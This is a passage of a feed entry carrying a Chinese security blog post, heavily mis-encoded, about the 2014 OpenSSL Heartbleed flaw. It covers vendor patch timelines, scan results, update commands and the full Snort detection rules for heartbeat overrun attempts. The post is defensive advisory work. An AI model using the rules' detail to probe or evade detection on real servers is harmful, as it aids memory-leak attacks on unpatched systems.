    &lt;li&gt;OpenSUSE ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 05:32 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Scentific ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 08:27 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Gentoo ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 09:36 æ­£å¼ä¿®å¾©ã€‚&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;é‡é»æ•´ç†ï¼š&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;RedHat ä¿®å¾©çš„é€Ÿåº¦æ¯” OpenSSL å®˜æ–¹é‚„å¿«ã€‚&lt;/li&gt;
    &lt;li&gt;RedHat æ´¾ç³»çš„ä¿®å¾©æ™‚é–“ï¼Œé™¤äº† RedHat å¤–éƒ½ç®—æ…¢ï¼Œå¦‚ Fedora åŠ CentOSã€Scentificï¼Œä»–å€‘éƒ½æ¯” RedHat æ…¢ 16 å°æ™‚ä»¥ä¸Šã€‚&lt;/li&gt;
    &lt;li&gt;Debian æ´¾ç³»çš„ä¿®å¾©æ™‚é–“ï¼Œå¦‚ Debian åŠ Ubuntuï¼Œéƒ½æ¯” RedHat æ…¢ä¸Šè‡³å°‘ 12 å°æ™‚ä»¥ä¸Šã€‚&lt;/li&gt;
    &lt;li&gt;Gentoo æ˜¯åˆ—è¡¨ä¸­ä¿®å¾©æœ€æ…¢çš„ã€‚&lt;/li&gt;
    &lt;li&gt;è‹¥ä»¥è³‡å®‰é»ƒé‡‘ 6 å°æ™‚ä¾†èªªï¼ŒFedoraã€CentOSã€OpenSUSEã€Scentific åŠ Gentoo éƒ½ä¸åŠæ ¼ã€‚&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;ä¸‰ã€å¤§å…¬å¸æ›´æ–°çš„é€Ÿåº¦&lt;/p&gt;

  &lt;p&gt;åŒæ¨£åœ°ï¼Œå¾è³‡å®‰äº‹ä»¶çš„è™•ç†å¯ä»¥æ¨æ•²å‡ºå„å…¬å¸å°æ–¼ç·Šæ€¥äº‹ä»¶çš„åæ‡‰é€Ÿåº¦ã€‚&lt;/p&gt;

  &lt;p&gt;é›²ç«¯ç›¸é—œå…¬å¸&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Cloudflare ç´„åœ¨ 2014å¹´4æœˆ7æ—¥ 11æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;DigitalOcean ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 12æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;AWS ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 12æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Linode ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 14æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
    &lt;li&gt;Heroku ç´„åœ¨ 2014å¹´4æœˆ8æ—¥ 16æ™‚ä¿®å¾©ã€‚&lt;/li&gt;
  &lt;/ul&gt;

  &lt;p&gt;æœ‰äº›å…¬å¸ç›´åˆ° 2014å¹´4æœˆ8æ—¥ 16æ™‚éƒ½é‚„æ²’ä¿®å¾©ã€‚æ­¤æ™‚å·²é›¢å®˜æ–¹æ­£å¼ä¿®å¾©æ•´æ•´ä¸€å¤©ï¼Œä¹Ÿæ¯”ä¸Šè¿°æ©Ÿå™¨æ•¸å¾ˆå¤šçš„é›²ç«¯ç›¸é—œå…¬å¸é‚„æ…¢ã€‚é€™äº›å…¬å¸ç‚ºï¼Œ&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;Yahoo.com / Flickr.com&lt;/li&gt;
    &lt;li&gt;Kaspersky.com (è³‡å®‰å…¬å¸)&lt;/li&gt;
    &lt;li&gt;stackoverflow.com&lt;/li&gt;
    &lt;li&gt;stackexchange .com&lt;/li&gt;
    &lt;li&gt;php.net&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ„Ÿè¬ StackNG çš„è£œå……ï¼šCloudflare æ–¼ 2014 å¹´ 4 æœˆ 7 æ—¥ 11 æ™‚å…¬å‘Šï¼Œä½†åœ¨æ¼æ´å…¬å‘Šä¹‹å‰å·²ç¶“ä¿®å¾©ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç›®å‰é‚„æœ‰å“ªäº›ä¼ºæœå™¨æœ‰å•é¡Œå‘¢&quot;&gt;ç›®å‰é‚„æœ‰å“ªäº›ä¼ºæœå™¨æœ‰å•é¡Œå‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æ ¹æ“š &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; çš„&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;ç ”ç©¶å ±å‘Š&lt;/a&gt;æŒ‡å‡ºï¼Œä»–å€‘é‡å° &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa å‰ä¸€ç™¾è¬å€‹ç¶²ç«™&lt;/a&gt;é€²è¡Œæª¢æ¸¬ï¼Œå¤§ç´„æœ‰ 36% çš„ä¼ºæœå™¨æ”¯æ´ TLSã€7.6% çš„ä¼ºæœå™¨å«æœ‰æ­¤æ¼æ´ã€‚ZMap ä¸¦æä¾›äº†ä¸€å€‹&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;å®Œæ•´çš„æ¸…å–®&lt;/a&gt;åˆ—å‡ºåœ¨ 2014/4/11 17:00 å°šæœªä¿®å¾©æ¼æ´çš„ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;æœ‰ä»€éº¼å€¼å¾—æ¸¬è©¦çš„ç¶²ç«™å‘¢&quot;&gt;æœ‰ä»€éº¼å€¼å¾—æ¸¬è©¦çš„ç¶²ç«™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘è¦æ€éº¼æ›´æ–°-openssl-å‘¢&quot;&gt;æˆ‘è¦æ€éº¼æ›´æ–° OpenSSL å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æ ¹æ“šä¸åŒçš„ Linux Distribution æœ‰ä¸åŒçš„æ›´æ–°æ–¹å¼ï¼Œè‹¥æœ‰è‡ªå·±å®¢è£½åŒ–ä¸€äº›ç¨‹å¼è¨­å®šï¼Œå¯èƒ½å°±éœ€è¦è‡ªè¡Œæ›´æ–°ã€‚ä»¥ä¸‹æˆ‘å€‘ç°¡å–®ä»‹ç´¹æ›´æ–°æ­¥é©Ÿï¼š&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora ç³»åˆ—æ›´æ–°å¥—ä»¶ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum update
yum update openssl #åªæ›´æ–° OpenSSL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian / Ubuntu ç³»åˆ—æ›´æ–°å¥—ä»¶ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è‹¥åªè¦æ›´æ–° OpenSSL å‰‡å¯ä»¥åŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ³¨æ„ OpenSSL æ˜¯å¦å·²ç¶“æ›´æ–°ç‚ºä¿®å¾©çš„ç‰ˆæœ¬ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ¥è‘—è«‹è¨˜å¾—æ’¤éŠ·åŸæœ¬çš„ç°½ç« é‡‘é‘°ï¼Œé‡æ–°ç°½ç½²ï¼Œä¸¦è¨˜å¾—æäº¤ CSR (Certificate Signing Request) çµ¦ CA (Certification Authority)ã€‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çµæŸå¾Œè¨˜å¾—é‡æ–°å•Ÿå‹•ç›¸é—œæœå‹™&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œå†ä½¿ç”¨æª¢æ¸¬å·¥å…·çœ‹è‡ªå·±çš„ç¶²é ä¼ºæœå™¨æˆ–å…¶ä»–ç›¸é—œæœå‹™æ˜¯å¦å·²ç¶“ä¸åœ¨æ¼æ´å—å®³ç¯„åœã€‚&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘ç„¡æ³•æ›´æ–°æˆ‘çš„ä¼ºæœå™¨æˆ‘è©²æ€éº¼åœ¨-ids-åµæ¸¬æ”»æ“Šå‘¢&quot;&gt;æˆ‘ç„¡æ³•æ›´æ–°æˆ‘çš„ä¼ºæœå™¨ï¼Œæˆ‘è©²æ€éº¼åœ¨ IDS åµæ¸¬æ”»æ“Šå‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è‹¥ä½ ä½¿ç”¨ Snort IDSï¼Œå®˜æ–¹å·²ç¶“é‡‹å‡º SID 30510 åˆ° 30517 ä¾†åµæ¸¬ï¼Œä¸¦ä¸”åœ¨ Community Rules ä¸­ä¹Ÿæœ‰åŒ…å«ã€‚&lt;br /&gt;
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; SIDs &lt;span class=&quot;m&quot;&gt;30510&lt;/span&gt; through &lt;span class=&quot;m&quot;&gt;30517&lt;/span&gt; address detection of the heartbleed attack 

&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL SSLv3 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 00|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;  &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30510; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 01|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30511; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 02|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30512; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.2 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 03|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30513; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER SSLv3 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 00|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30514; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 01|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30515; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 02|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30516; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.2 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 03|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30517; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;æ°‘çœ¾èˆ‡ç®¡ç†è€…æ‡‰å°æªæ–½&quot;&gt;æ°‘çœ¾èˆ‡ç®¡ç†è€…æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;p&gt;ä¸å°‘æœ‹å‹ä¾†ä¿¡ã€ç•™è¨€æ´½è©¢ï¼Œåˆ°åº•è‡ªå·±è©²æ€éº¼é‡å°é€™æ¬¡çš„æ¼æ´æ‡‰è®Šï¼Ÿæˆ‘å€‘ç°¡å–®å°±ä¸€èˆ¬æ°‘çœ¾ä»¥åŠç³»çµ±ç®¡ç†è€…èªªæ˜ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¸€èˆ¬æ°‘çœ¾æ‡‰å°æªæ–½&quot;&gt;ä¸€èˆ¬æ°‘çœ¾æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æ³¨æ„å¸¸ç”¨çš„é‡è¦ç¶²ç«™æœå‹™ï¼Œæ˜¯å¦æœ‰é‡å° Heartbleed æ¼æ´çš„æ›´æ–°æªæ–½ã€‚ä¸å°‘å¤§å…¬å¸éƒ½æœ‰ç™¼å‡ºå…¬å‘Šã€å…¬å‘Šä¿¡ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥å¸¸ç”¨ç¶²ç«™æœå‹™æœ‰é­é‡æ­¤é¢¨éšªï¼Œè¨˜å¾—æ›´æ›å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥é€™æ®µæ™‚é–“æœ‰ç¶²ç«™é€šçŸ¥æ›´æ›å¯†ç¢¼ï¼Œä¹Ÿè«‹æ³¨æ„æ˜¯å¦ç‚ºé‡£é­šä¿¡ä»¶ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„è‡ªå·±çš„å¸³è™Ÿæ˜¯å¦æœ‰ç•°å¸¸æ´»å‹•ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥ä½¿ç”¨çš„ç¶²ç«™æœå‹™å°±æ˜¯ä¸æ›´æ–°ï¼Œ&lt;strong&gt;ä¸€å¤©ä¸€ä¿¡å‹å–„æé†’ç®¡ç†è€…&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç³»çµ±ç®¡ç†è€…æ‡‰å°æªæ–½&quot;&gt;ç³»çµ±ç®¡ç†è€…æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æ›´æ–° OpenSSL è‡³ 1.0.1g æˆ– 1.0.2-beta2ï¼Œä¸¦å¯†åˆ‡æ³¨æ„æœ‰ç„¡å¾ŒçºŒæ›´æ–°ã€‚&lt;/li&gt;
  &lt;li&gt;é‡æ–°ç”¢ç”Ÿé‡‘é‘°ï¼ˆPrivate Key å¯èƒ½å¤–æ´©ï¼‰ã€Sessionï¼ˆSession ID å¯èƒ½å¤–æ´©ï¼‰ã€å¯†ç¢¼ï¼ˆå¯†ç¢¼ä¹Ÿå¯èƒ½å¤–æ´©ï¼‰ï¼Œä¸¦ä¸”æ’¤éŠ·åŸæœ¬çš„é‡‘é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥ç„¡æ³•æ›´æ–°ï¼Œé‡æ–°ç·¨è­¯ OpenSSL ä»¥é—œé–‰ heartbeat åŠŸèƒ½ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;ï¼Œåœ¨æœªä¾†é¡ä¼¼é¢¨éšªç™¼ç”Ÿæ™‚æ¸›ä½å‚·å®³ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¨±å¤šæ¥­è€…æŠ±æŒè‘—åƒ¥å€–çš„å¿ƒæ…‹ï¼Œæƒ³èªªå¤–æ´©çš„ç›®æ¨™ä¸æœƒè¼ªåˆ°è‡ªå·±ã€‚å¦‚æœå¤§å®¶çœ‹åˆ°é€™å¹¾å¤©&lt;strong&gt;å…¨ä¸–ç•Œè³‡å®‰äººå“¡ / é§­å®¢ä¸çœ ä¸ä¼‘çš„æ’ˆå–è³‡æ–™&lt;/strong&gt;ï¼Œæ‡‰è©²æœƒå¾¹åº•æ¶ˆæ»…åƒ¥å€–çš„æƒ³æ³•ä¹–ä¹–åšå¥½é˜²è­·ã€‚åœ¨æ¼æ´æ­éœ²çš„é ­å¹¾å¤©ï¼Œå°±å·²ç¶“é™¸çºŒçœ‹åˆ°ä¸å°‘é§­å®¢é€²å…¥ Googleã€Facebookã€Yahoo! ç­‰ä¼ºæœå™¨ï¼Œä¸¦ä¸”æ’°å¯«å¤§è¦æ¨¡æƒæå·¥å…·å¤§é‡æ”»æ“Šã€‚é™¤éä½ æœ‰æŠŠæ¡è‡ªå·±çš„ä¼ºæœå™¨æ²’æœ‰ä»»ä½•é€£ç·šï¼Œä¸ç„¶é‚„æ˜¯è«‹ä¹–ä¹–æ›´æ–°å§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¤§äº‹ä»¶å¤§å•Ÿç¤º&quot;&gt;å¤§äº‹ä»¶ï¼Œå¤§å•Ÿç¤º&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—ä¹‹å‰æˆ‘å€‘æåˆ°çš„ã€Œ&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„è³‡å®‰é¢¨éšª&lt;/a&gt;ã€ï¼Ÿé€™æ¬¡çš„äº‹ä»¶å°±æ˜¯ä¸€å€‹è¡€æ·‹æ·‹çš„æ¡ˆä¾‹ã€‚ä¸ç®¡æ˜¯å» å•†ã€ç¤¾ç¾¤ã€å€‹äººé–‹ç™¼è€…çš„ç²—å¿ƒå¤±èª¤ï¼Œæˆ–è€…æ˜¯åœ‹å®¶æ©Ÿå™¨ NSA çš„å¼·åŠ›æ»²é€ï¼Œä½¿ç”¨å„ç¨®ç¬¬ä¸‰æ–¹çš„å¥—ä»¶éƒ½éœ€è¦æ‰¿æ“”æ¥µå¤§çš„é¢¨éšªã€‚ä½†å¯æ‚²çš„æ˜¯ï¼Œæˆ‘å€‘å»ç„¡æ³•ä¸ä½¿ç”¨ã€‚å¾é€™æ¬¡çš„äº‹ä»¶æˆ‘å€‘å¯ä»¥å­¸åˆ°å¹¾ä»¶äº‹æƒ…ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸ç®¡å“ªç¨®æ”»æ“Šæ‰‹æ³•ã€å¤šè€èˆŠçš„æ”»æ“Šæ‰‹æ³•ï¼Œåœ¨æœªä¾†éƒ½å¯èƒ½æœƒå†åº¦ç™¼ç”Ÿã€‚&lt;/li&gt;
  &lt;li&gt;ç¨‹å¼ç¢¼çš„ review éå¸¸é‡è¦ï¼Œä¸€å®šè¦åœ¨é–‹ç™¼éç¨‹ä¸­å°å…¥ç¨‹å¼ç¢¼ review æ©Ÿåˆ¶ï¼Œä»¥å…é–‹ç™¼è€…å¯«å‡ºå«æœ‰å®‰å…¨ç–‘æ…®çš„ç¨‹å¼ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ å¯†ã€Session æ§ç®¡ã€é‡‘é‘°æ§ç®¡ç­‰è­°é¡Œï¼Œæ˜¯æ°¸é çš„èª²é¡Œã€‚ä¸€å¤©æ²’è™•ç†å¥½ï¼Œåœ¨æœªä¾†çš„é¢¨éšªä¸­æœƒå†åº¦å—å®³ã€‚&lt;/li&gt;
  &lt;li&gt;é¢¨éšªæ°¸é æœƒç™¼ç”Ÿåœ¨ä½ çŒœä¸åˆ°çš„åœ°æ–¹ï¼Œå¯èƒ½æ˜¯ç¨‹å¼ã€å¯èƒ½æ˜¯å‡½å¼åº«ã€&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;å¯èƒ½æ˜¯åŠ å¯†å”å®š&lt;/a&gt;ã€æ›´å¯èƒ½æ˜¯&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;äº‚æ•¸ç”¢ç”Ÿå™¨&lt;/a&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸æ–·çš„å¢å¼·è³‡å®‰æ„è­˜ã€ä¸åœçš„åˆ†äº«æ–°çŸ¥ã€å» å•†åšå¥½è³‡å®‰æ§ç®¡åŠ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;å®‰å…¨æª¢æ¸¬&lt;/a&gt;ã€æ°‘çœ¾å°ä¼æ¥­å’Œæ”¿åºœè¦æ±‚è³‡è¨Šå®‰å…¨ï¼Œé›†åˆå¤§å®¶çš„åŠ›é‡ï¼Œæ˜¯æ”¹å–„è³‡å®‰å¤§ç’°å¢ƒçš„ä¸äºŒæ³•é–€ã€‚&lt;/p&gt;

&lt;p&gt;ä½ ä»¥ç‚ºè‡ªå·±é€ƒéä¸€åŠ«äº†å—ï¼Ÿä¹Ÿè¨±ä½ çš„èº«é«”å·²ç¶“è¡€æµå¦‚æŸ±ï¼Œè€Œå—œè¡€çš„é¯Šé­šæ­£æ¸¸å‘ä½ ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/</link>
                <guid>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</guid>
                <pubDate>Fri, 11 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL CVE-2014-0160 Heartbleed åš´é‡æ¼æ´ </title>
                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-åš´é‡æ¼æ´&quot;&gt;OpenSSL CVE-2014-0160 åš´é‡æ¼æ´&lt;/h3&gt;

